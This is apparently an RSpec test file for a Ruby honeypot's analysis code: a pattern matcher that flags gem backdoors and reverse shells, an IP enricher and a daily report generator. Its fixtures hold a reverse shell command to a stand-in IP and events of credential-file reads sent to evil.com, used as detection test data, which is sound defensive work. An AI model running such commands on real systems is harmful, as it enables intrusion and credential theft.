# frozen_string_literal: true

require "rspec"
require "json"
require "tmpdir"
require "fileutils"

require_relative "../analysis/pattern_matcher"
require_relative "../analysis/ip_enricher"
require_relative "../analysis/daily_report"

RSpec.describe RubyGuardian::Honeypot::Analysis do
  let(:logger) { Logger.new(File::NULL) }

  describe RubyGuardian::Honeypot::Analysis::PatternMatcher do
    subject(:matcher) { described_class.new(logger: logger) }

    describe "#initialize" do
      it "loads builtin rules" do
        expect(matcher.rules).not_to be_empty
        expect(matcher.rules.size).to be >= 8
      end

      it "accepts custom rules" do
        custom = [{
          name: "custom_test_rule",
          family: "TestFamily",
          description: "Test rule",
          severity: :medium,
          tags: ["test"],
          conditions: { all: [{ category: :file_access, min_count: 1 }] }
        }]
        m = described_class.new(custom_rules: custom, logger: logger)
        expect(m.rules.any? { |r| r.name == "custom_test_rule" }).to be true
      end
    end

    describe "#match" do
      let(:cred_theft_events) do
        [
          { category: :credential_access, description: "Read .gem/credentials", details: "", severity: :critical, timestamp: Time.now.utc.iso8601 },
          { category: :network_connection, description: "TCP to evil.com:443", details: "", severity: :high, timestamp: Time.now.utc.iso8601 }
        ]
      end

      let(:reverse_shell_events) do
        [
          { category: :process_execution, description: "bash -i >/dev/tcp/1.2.3.4/4444", details: "bash -i >/dev/tcp/1.2.3.4/4444", severity: :critical, timestamp: Time.now.utc.iso8601 }
        ]
      end

      it "matches gem backdoor pattern" do
        results = matcher.match(cred_theft_events)
        families = results.map { |r| r[:family] }
        expect(families).to include("GemBackdoor")
      end

      it "matches reverse shell pattern" do
        results = matcher.match(reverse_shell_events)
        families = results.map { |r| r[:family] }
        expect(families).to include("ReverseShell")
      end

      it "returns empty for benign events" do
        benign = [
          { category: :file_access, description: "Read /tmp/test.txt", details: "", severity: :low, timestamp: Time.now.utc.iso8601 }
        ]
        results = matcher.match(benign)
        expect(results).to be_empty
      end

      it "returns confidence scores" do
        results = matcher.match(cred_theft_events)
        results.each do |r|
          expect(r[:confidence]).to be_a(Numeric)
          expect(r[:confidence]).to be_between(0, 100)
        end
      end
    end

    describe "#top_match" do
      it "returns the highest severity match" do
        events = [
          { category: :credential_access, description: "Read .gem/credentials", details: "", severity: :critical, timestamp: Time.now.utc.iso8601 },
          { category: :network_connection, description: "TCP to evil.com:443", details: "", severity: :high, timestamp: Time.now.utc.iso8601 }
        ]
        matcher.match(events)
        top = matcher.top_match
        expect(top).not_to be_nil
        expect(top[:severity]).to eq(:critical)
      end

      it "returns nil when no matches" do
        matcher.match([])
        expect(matcher.top_match).to be_nil
      end
    end

    describe "#report" do
      it "generates a structured report" do
        events = [
          { category: :credential_access, description: "Read .aws/credentials", details: "", severity: :critical, timestamp: Time.now.utc.iso8601 },
          { category: :network_connection, description: "HTTP POST", details: "", severity: :high, timestamp: Time.now.utc.iso8601 }
        ]
        matcher.match(events)
        report = matcher.report

        expect(report).to have_key(:total_rules)
        expect(report).to have_key(:matches_found)
        expect(report).to have_key(:matched_families)
        expect(report).to have_key(:all_matches)
      end
    end
  end

  describe RubyGuardian::Honeypot::Analysis::IPEnricher do
    let(:cache_dir) { Dir.mktmpdir("rg_ip_cache_test") }

    subject(:enricher) { described_class.new(cache_dir: cache_dir, logger: logger) }

    after { FileUtils.rm_rf(cache_dir) }

    describe "#initialize" do
      it "starts with empty cache" do
        expect(enricher.cache).to be_empty
      end

      it "initializes enrichment stats" do
        expect(enricher.enrichment_stats[:total]).to eq(0)
        expect(enricher.enrichment_stats[:errors]).to eq(0)
      end
    end

    describe "#enrich" do
      it "skips private IPs" do
        result = enricher.enrich("192.168.1.1")
        expect(result[:is_private]).to be true
        expect(enricher.enrichment_stats[:private_skipped]).to eq(1)
      end

      it "skips loopback addresses" do
        result = enricher.enrich("127.0.0.1")
        expect(result[:is_private]).to be true
      end

      it "includes threat assessment for private IPs" do
        result = enricher.enrich("10.0.0.1")
        expect(result[:threat_assessment][:score]).to eq(0)
        expect(result[:threat_assessment][:risk_level]).to eq(:none)
      end

      it "caches enrichment results" do
        enricher.enrich("192.168.1.100")
        enricher.enrich("192.168.1.100")
        expect(enricher.enrichment_stats[:cached]).to eq(1)
      end
    end

    describe "#enrich_batch" do
      it "deduplicates IPs" do
        results = enricher.enrich_batch(["192.168.1.1", "192.168.1.1", "10.0.0.1"])
        expect(results.size).to eq(2)
      end

      it "skips nil and empty entries" do
        results = enricher.enrich_batch([nil, "", "192.168.1.1"])
        expect(results.size).to eq(1)
      end
    end

    describe "#summary_report" do
      it "returns structured summary" do
        enricher.enrich("192.168.1.1")
        report = enricher.summary_report

        expect(report).to have_key(:stats)
        expect(report).to have_key(:total_enriched)
        expect(report).to have_key(:high_threat_ips)
      end
    end

    describe "#save_cache" do
      it "persists cache to disk" do
        enricher.enrich("10.0.0.1")
        enricher.save_cache

        cache_file = File.join(cache_dir, "ip_enrichment_cache.json")
        expect(File.exist?(cache_file)).to be true
      end
    end
  end

  describe RubyGuardian::Honeypot::Analysis::DailyReport do
    let(:data_dir) { Dir.mktmpdir("rg_report_data") }
    let(:output_dir) { Dir.mktmpdir("rg_report_output") }
    let(:report_date) { Date.today }

    subject(:report) do
      described_class.new(data_dir: data_dir, output_dir: output_dir, report_date: report_date, logger: logger)
    end

    after do
      FileUtils.rm_rf(data_dir)
      FileUtils.rm_rf(output_dir)
    end

    describe "#initialize" do
      it "sets report date" do
        expect(report.report_date).to eq(report_date)
      end
    end

    describe "#build_metadata" do
      it "includes required metadata fields" do
        meta = report.build_metadata
        expect(meta[:report_date]).to eq(report_date.iso8601)
        expect(meta[:generated_at]).to be_a(String)
        expect(meta[:version]).to eq("1.0.0")
      end
    end

    describe "#generate!" do
      it "creates JSON and text report files" do
        report.generate!

        json_path = File.join(output_dir, "daily_report_#{report_date.iso8601}.json")
        text_path = File.join(output_dir, "daily_report_#{report_date.iso8601}.txt")

        expect(File.exist?(json_path)).to be true
        expect(File.exist?(text_path)).to be true
      end

      it "populates report data" do
        report.generate!
        expect(report.data).to have_key(:metadata)
        expect(report.data).to have_key(:capture_summary)
        expect(report.data).to have_key(:sample_analysis)
        expect(report.data).to have_key(:network_activity)
        expect(report.data).to have_key(:recommendations)
      end

      it "generates text report with correct format" do
        report.generate!
        text_path = File.join(output_dir, "daily_report_#{report_date.iso8601}.txt")
        content = File.read(text_path)

        expect(content).to include("RubyGuardian Honeypot Daily Report")
        expect(content).to include("Capture Summary")
        expect(content).to include("Sample Analysis")
        expect(content).to include("Recommendations")
      end
    end
  end
end
